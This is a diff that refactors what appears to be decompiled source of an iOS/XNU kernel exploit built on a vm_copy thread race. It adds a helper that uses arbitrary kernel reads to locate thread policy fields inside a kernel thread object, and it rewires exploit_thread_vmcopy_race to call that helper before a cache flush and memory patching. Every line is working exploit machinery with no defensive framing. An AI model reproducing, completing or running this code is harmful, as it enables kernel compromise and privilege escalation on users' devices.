@@ -219,6 +219,26 @@ static inline void vmcopy_init_trigger_thread_block(
   block->state = state;
 }
 
+static inline uint32_t vmcopy_find_thread_policy_offset(
+        __int64 kreadCtx,
+        uint64_t threadKobject,
+        const integer_t policyInfo[4])
+{
+  uint32_t foundOffset = 0;
+
+  for ( uint32_t offset = 252; offset < 0x2FC; offset += 4 )
+  {
+    if ( kread_u32_value(kreadCtx, threadKobject + offset + 4) != (uint32_t)policyInfo[0] )
+      continue;
+    if ( kread_u32_value(kreadCtx, threadKobject + offset + 8) != (uint32_t)policyInfo[1] )
+      continue;
+    if ( kread_u32_value(kreadCtx, threadKobject + offset + 12) == (uint32_t)policyInfo[2] )
+      foundOffset = offset + 4;
+  }
+
+  return foundOffset;
+}
+
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
 {
   memset(scratch, 0, 32);
@@ -7816,11 +7836,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   vm_address_t v27; // x26
   thread_act_t v28; // w22
   unsigned __int64 v29; // x22
-  unsigned __int64 i; // x24
-  int v31; // w0
-  int v32; // w0
-  int v33; // w0
-  unsigned int v34; // w8
   __int64 *v35; // x24
   vm_address_t v36; // x28
   thread_act_t v37; // w0
@@ -8041,25 +8056,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     thread_policy_set(v28, 2u, policy_info, 4u);
     v29 = get_task_kobject_addr_from_field32(*(uint64_t *)(someStruct + 8), v28);
     if ( !v107 )
-    {
-      v107 = 0;
-      for ( i = 252; i < 0x2FC; i += 4LL )
-      {
-        v31 = kread_u32_value(*v2, v29 + i + 4);
-        if ( v31 == policy_info[0] )
-        {
-          v32 = kread_u32_value(*v2, v29 + i + 8);
-          if ( v32 == policy_info[1] )
-          {
-            v33 = kread_u32_value(*v2, v29 + i + 12);
-            v34 = v107;
-            if ( v33 == policy_info[2] )
-              v34 = i + 4;
-            v107 = v34;
-          }
-        }
-      }
-    }
+      v107 = vmcopy_find_thread_policy_offset(*v2, v29, policy_info);
     v35 = (__int64 *)(v98 + (v23 & 0x3FFF) + v97);
     v36 = v27 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v29 + v107 + 4, 1);
